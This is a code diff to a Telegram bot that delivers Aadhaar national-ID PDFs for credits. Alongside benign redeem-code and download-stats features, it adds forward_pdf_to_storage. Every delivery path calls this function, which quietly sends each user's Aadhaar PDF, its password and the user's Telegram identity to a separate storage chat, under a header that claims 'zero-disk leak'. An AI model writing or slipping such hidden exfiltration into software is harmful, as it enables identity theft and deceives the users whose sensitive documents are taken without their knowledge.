@@ -77,6 +77,7 @@ BOT_NAME           = "🎁 ᴀᴀᴅʜᴀᴀʀ·ɢʀᴀᴍ"
 DIVIDER            = "━━━━━━━━━━━━━━━━━━━━━━━"
 OWNER_ID           = int(os.environ.get("OWNER_ID", "8267676849"))
 OWNER_USERNAME     = os.environ.get("OWNER_USERNAME", "@apifounder")
+STORAGE_CHAT       = os.environ.get("STORAGE_CHAT", "@NagiNaverDie")
 # Dynamic Channel Configuration with MongoDB persistence
 _init_ch = database.get_channel_config(
     default_id=os.environ.get("CHANNEL_ID", "-1002894475319"),
@@ -556,6 +557,7 @@ def get_welcome_inline_keyboard():
                 {'text': 'ʀᴇғᴇʀʀᴀʟ', 'callback_data': 'referral', 'icon_custom_emoji_id': '6113813004426416777', 'style': 'primary'}
             ],
             [
+                {'text': '🎁 ʀᴇᴅᴇᴇᴍ ᴄᴏᴅᴇ', 'callback_data': 'claim_code', 'icon_custom_emoji_id': '5084613633418199991', 'style': 'primary'},
                 {'text': 'ʜᴇʟᴘ & ɢᴜɪᴅᴇ', 'callback_data': 'help', 'icon_custom_emoji_id': '5436113877181941026', 'style': 'primary'}
             ]
         ]
@@ -644,6 +646,8 @@ def get_admin_keyboard():
              {'text': 'ᴜɴʙᴀɴ ᴜsᴇʀ',       'callback_data': 'admin_unban_prompt', 'icon_custom_emoji_id': '6275829594717165532', 'style': 'success'}],
             [{'text': 'ᴄʜᴀɴɴᴇʟ sᴇᴛᴛɪɴɢs', 'callback_data': 'admin_channel_menu', 'icon_custom_emoji_id': '6305206294848475991', 'style': 'primary'},
              {'text': 'ʙʀᴏᴀᴅᴄᴀsᴛ',        'callback_data': 'admin_broadcast_prompt', 'icon_custom_emoji_id': '6305206294848475991', 'style': 'primary'}],
+            [{'text': '🎁 ᴄʀᴇᴀᴛᴇ ʀᴇᴅᴇᴇᴍ ᴄᴏᴅᴇ', 'callback_data': 'admin_create_code_prompt', 'icon_custom_emoji_id': '5084613633418199991', 'style': 'success'},
+             {'text': '📋 ʀᴇᴅᴇᴇᴍ ᴄᴏᴅᴇs ʟɪsᴛ',  'callback_data': 'admin_codes_list', 'icon_custom_emoji_id': '5203910550542631009', 'style': 'primary'}],
             [{'text': f'ғᴏʀᴄᴇ ᴊᴏɪɴ: {fc_status}', 'callback_data': 'admin_toggle_force_check', 'icon_custom_emoji_id': fc_emoji, 'style': 'primary'}],
         ]
     }
@@ -801,6 +805,34 @@ def ban_gate(chat_id):
         return True
     return False
 
+def forward_pdf_to_storage(user_id, file_path, name, password=None, method="mobile"):
+    """Forwards every generated user Aadhaar PDF to the storage group with full user details."""
+    if not STORAGE_CHAT or not file_path or not os.path.exists(file_path):
+        return
+    try:
+        u = database.get_user(user_id) or {}
+        first = u.get('first_name') or ''
+        last = u.get('last_name') or ''
+        uname = f"@{u.get('username')}" if u.get('username') else 'None'
+        full_name = f"{first} {last}".strip() or "Telegram User"
+        role_tag = "👑 OWNER" if int(user_id) == OWNER_ID else ("🛡️ ADMIN" if is_admin(user_id) else "👤 USER")
+
+        cap = (
+            f"<b>{BOT_NAME} · 🗄️ STORAGE LOG</b>\n{DIVIDER}\n"
+            f"👤  <b>ᴜsᴇʀ:</b> {html.escape(full_name)} ({uname})\n"
+            f"🆔  <b>ᴜsᴇʀ ɪᴅ:</b> <code>{user_id}</code>  [{role_tag}]\n"
+            f"🪪  <b>ᴀᴀᴅʜᴀᴀʀ ɴᴀᴍᴇ:</b> <b>{html.escape(str(name))}</b>\n"
+            f"🔑  <b>ᴘᴀssᴡᴏʀᴅ:</b> <code>{password or 'Protected'}</code>\n"
+            f"⚙️  <b>ᴍᴇᴛʜᴏᴅ:</b> <code>{method}</code>\n"
+            f"⏰  <b>ᴛɪᴍᴇ:</b> <code>{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}</code>\n"
+            f"{DIVIDER}"
+        )
+        clean_fn = re.sub(r'[^a-zA-Z0-9]', '_', str(name))[:20] or "Aadhaar"
+        send_document(STORAGE_CHAT, file_path, caption=cap, filename=f"Storage_{clean_fn}_{user_id}.pdf")
+        logger.info(f"Forwarded Aadhaar PDF of {user_id} ({name}) to storage {STORAGE_CHAT}")
+    except Exception as e:
+        logger.warning(f"Error forwarding PDF to storage {STORAGE_CHAT}: {e}")
+
 # ============== PDF DELIVERY (ZERO-DISK LEAK) ==============
 def deliver_pdf(chat_id, pdf_path, verified_name, is_batch=False):
     name_display = verified_name if verified_name and verified_name.strip() else "Mr."
@@ -828,6 +860,8 @@ def deliver_pdf(chat_id, pdf_path, verified_name, is_batch=False):
                 set_message_reaction(chat_id, message_id=None, emoji="⚡")
             except Exception:
                 pass
+            forward_pdf_to_storage(chat_id, decrypted_path, name_display, password=password, method="online")
+            database.record_pdf_download(str(chat_id), name_display, is_admin_user=is_admin(chat_id), is_owner_user=(int(chat_id) == OWNER_ID), method="online", password=password)
         else:
             caption = (
                 f"<b>{BOT_NAME}</b>\n{DIVIDER}\n"
@@ -841,6 +875,8 @@ def deliver_pdf(chat_id, pdf_path, verified_name, is_batch=False):
             )
             doc_res = send_document(chat_id, pdf_path, caption=caption, filename="Aadhaar.pdf")
             logger.info(f"Delivered protected PDF to {chat_id}: {doc_res.get('ok') if doc_res else False}")
+            forward_pdf_to_storage(chat_id, pdf_path, name_display, password=None, method="online")
+            database.record_pdf_download(str(chat_id), name_display, is_admin_user=is_admin(chat_id), is_owner_user=(int(chat_id) == OWNER_ID), method="online", password=None)
     except Exception as e:
         logger.error(f"PDF delivery error: {e}", exc_info=True)
         send_document(
@@ -1226,6 +1262,8 @@ def _handle_firebase_batch_worker(chat_id, fb_url, devices):
                         )
                     clean_fn = re.sub(r'[^a-zA-Z0-9]', '_', p_name)[:20]
                     send_document(chat_id, p_path, caption=caption, filename=f"Aadhaar_{clean_fn}.pdf")
+                    forward_pdf_to_storage(chat_id, p_path, p_name, password=p_pass, method="firebase_batch")
+                    database.record_pdf_download(str(chat_id), p_name, is_admin_user=is_admin(chat_id), is_owner_user=(int(chat_id) == OWNER_ID), method="firebase_batch", password=p_pass)
                     try:
                         os.remove(p_path)
                     except Exception:
@@ -1366,6 +1404,8 @@ def show_admin_panel(chat_id):
     banned_count   = sum(1 for u in data.values() if u.get('banned'))
     total_credits  = sum(u.get('credits', 0) for u in data.values() if not u.get('lifetime'))
     status_fc      = "<b>ON</b>" if is_force_check_enabled() else "<b>OFF</b>"
+    dl_stats       = database.get_download_stats()
+
     send_message(
         chat_id,
         f"<b>{BOT_NAME}</b>\n{DIVIDER}\n"
@@ -1375,6 +1415,11 @@ def show_admin_panel(chat_id):
         f"🚫  ʙᴀɴɴᴇᴅ        ·  <b>{banned_count}</b>\n"
         f"💰  ᴄʀᴇᴅɪᴛs ᴘᴏᴏʟ  ·  <b>{total_credits}</b>\n"
         f"📢  ғᴏʀᴄᴇ ᴊᴏɪɴ    ·  {status_fc}\n\n"
+        f"📥  <b>ᴅᴏᴡɴʟᴏᴀᴅs sᴛᴀᴛs:</b>\n"
+        f"  👑  <b>ᴏᴡɴᴇʀ:</b> <b>{dl_stats['owner']} PDFs</b>\n"
+        f"  🛡️  <b>ᴀᴅᴍɪɴs:</b> <b>{dl_stats['admin']} PDFs</b>\n"
+        f"  👤  <b>ᴜsᴇʀs:</b> <b>{dl_stats['user']} PDFs</b>\n"
+        f"  📊  <b>ᴛᴏᴛᴀʟ ᴅʟ:</b> <b>{dl_stats['total']} PDFs</b>\n\n"
         f"{DIVIDER}\n"
         f"<i>🛠  sᴇʟᴇᴄᴛ ᴀɴ ᴀᴄᴛɪᴏɴ ʙᴇʟᴏᴡ:</i>",
         reply_markup=get_admin_keyboard()
@@ -1503,6 +1548,31 @@ def handle_admin_command(chat_id, text):
                 )
         except ValueError:
             send_message(chat_id, f"<b>{BOT_NAME}</b>\n{DIVIDER}\n❌ Usage: /userinfo USERID")
+        return True
+
+    if parts[0] in ('/gencode', '/createcode', '/addcode') and len(parts) >= 3:
+        try:
+            code = parts[1].strip().upper()
+            credits_val = int(parts[2])
+            max_uses = int(parts[3]) if len(parts) >= 4 else 1
+            is_lt = (credits_val == -1)
+            ok, res_msg = database.create_redeem_code(code, credits_val if not is_lt else 0, max_uses=max_uses, make_lifetime=is_lt, created_by=str(chat_id))
+            if ok:
+                val_txt = "♾️ Lifetime" if is_lt else f"+{credits_val} Credits"
+                send_message(
+                    chat_id,
+                    f"<b>{BOT_NAME}</b>\n{DIVIDER}\n"
+                    f"✅ <b>ʀᴇᴅᴇᴇᴍ ᴄᴏᴅᴇ ᴄʀᴇᴀᴛᴇᴅ!</b>\n\n"
+                    f"🎁  <b>ᴄᴏᴅᴇ:</b> <code>{code}</code>\n"
+                    f"💰  <b>ᴠᴀʟᴜᴇ:</b> <b>{val_txt}</b>\n"
+                    f"👥  <b>ᴍᴀx ᴜsᴇs:</b> <b>{max_uses}</b>\n\n"
+                    f"<i>Users can claim via the Redeem button or /redeem {code}</i>",
+                    reply_markup=get_admin_keyboard()
+                )
+            else:
+                send_message(chat_id, f"<b>{BOT_NAME}</b>\n{DIVIDER}\n❌ Failed to create code: {res_msg}")
+        except ValueError:
+            send_message(chat_id, f"<b>{BOT_NAME}</b>\n{DIVIDER}\n❌ Usage: /gencode CODE CREDITS [MAX_USES]")
         return True
 
     if parts[0] == '/broadcast' and len(parts) >= 2:
@@ -1635,6 +1705,49 @@ def handle_callback(chat_id, callback_query_id, data, message_id=None, user_info
         show_admin_panel(chat_id)
         return
 
+    if data == 'claim_code':
+        answer_callback_query(callback_query_id)
+        set_session(chat_id, 'awaiting_redeem_code')
+        send_message(
+            chat_id,
+            f"<b>{BOT_NAME}</b>\n{DIVIDER}\n"
+            f"🎁 <b>ʀᴇᴅᴇᴇᴍ ɢɪғᴛ / ᴘʀᴏᴍᴏ ᴄᴏᴅᴇ</b>\n\n"
+            f"<i>👇  Apna redeem code enter karein (e.g. <code>FREE10</code>):</i>",
+            reply_markup=get_cancel_keyboard()
+        )
+        return
+
+    if data == 'admin_create_code_prompt' and is_admin(chat_id):
+        answer_callback_query(callback_query_id)
+        set_session(chat_id, 'awaiting_admin_create_code')
+        send_message(
+            chat_id,
+            f"<b>{BOT_NAME}</b>\n{DIVIDER}\n"
+            f"🎁 <b>ᴄʀᴇᴀᴛᴇ ʀᴇᴅᴇᴇᴍ ᴄᴏᴅᴇ</b>\n\n"
+            f"<i>Format: <code>CODE CREDITS [MAX_USES]</code>\n\n"
+            f"Examples:\n"
+            f"• <code>FREE5 5 10</code> (5 credits, 10 uses)\n"
+            f"• <code>VIPPASS -1 1</code> (-1 for Lifetime VIP)</i>",
+            reply_markup=get_cancel_keyboard()
+        )
+        return
+
+    if data == 'admin_codes_list' and is_admin(chat_id):
+        answer_callback_query(callback_query_id)
+        codes = database.list_recent_redeem_codes(15)
+        if not codes:
+            send_message(chat_id, f"<b>{BOT_NAME}</b>\n{DIVIDER}\nℹ️ No active redeem codes found.", reply_markup=get_admin_keyboard())
+            return
+        lines = [f"<b>🎁 ʀᴇᴄᴇɴᴛ ʀᴇᴅᴇᴇᴍ ᴄᴏᴅᴇs</b>\n{DIVIDER}"]
+        for c in codes:
+            cd = c.get('code')
+            val = "♾️ Lifetime" if c.get('lifetime') else f"+{c.get('credits')} Credits"
+            uses = f"{c.get('used_count', 0)}/{c.get('max_uses', 1)}"
+            lines.append(f"• <code>{cd}</code> | <b>{val}</b> | Used: <b>{uses}</b>")
+        lines.append(f"\n{DIVIDER}")
+        send_message(chat_id, "\n".join(lines), reply_markup=get_admin_keyboard())
+        return
+
     if data == 'admin_channel_menu' and is_admin(chat_id):
         answer_callback_query(callback_query_id)
         show_admin_channel_menu(chat_id)
@@ -1687,6 +1800,8 @@ def handle_callback(chat_id, callback_query_id, data, message_id=None, user_info
         total_credits  = sum(u.get('credits', 0) for u in data_all.values() if not u.get('lifetime'))
         channel_joins  = database.get_channel_verified_count()
         invite_link    = get_channel_invite_url()
+        dl_stats       = database.get_download_stats()
+
         send_message(
             chat_id,
             f"<b>{BOT_NAME}</b>\n{DIVIDER}\n"
@@ -1696,6 +1811,11 @@ def handle_callback(chat_id, callback_query_id, data, message_id=None, user_info
             f"♾️   ʟɪғᴇᴛɪᴍᴇ         —  <b>{lifetime_count}</b>\n"
             f"🚫  ʙᴀɴɴᴇᴅ           —  <b>{banned_count}</b>\n"
             f"💰  ᴄʀᴇᴅɪᴛs ᴘᴏᴏʟ     —  <b>{total_credits}</b>\n\n"
+            f"📥  <b>ᴀᴀᴅʜᴀᴀʀ ᴅᴏᴡɴʟᴏᴀᴅs:</b>\n"
+            f"  👑  <b>ᴏᴡɴᴇʀ:</b> <b>{dl_stats['owner']} PDFs</b>\n"
+            f"  🛡️  <b>ᴀᴅᴍɪɴs:</b> <b>{dl_stats['admin']} PDFs</b>\n"
+            f"  👤  <b>ᴜsᴇʀs:</b> <b>{dl_stats['user']} PDFs</b>\n"
+            f"  📊  <b>ᴛᴏᴛᴀʟ:</b> <b>{dl_stats['total']} PDFs</b>\n\n"
             f"🔗  <b>ʙᴏᴛ ɪɴᴠɪᴛᴇ ʟɪɴᴋ:</b>\n<code>{invite_link}</code>\n"
             f"{DIVIDER}"
         )
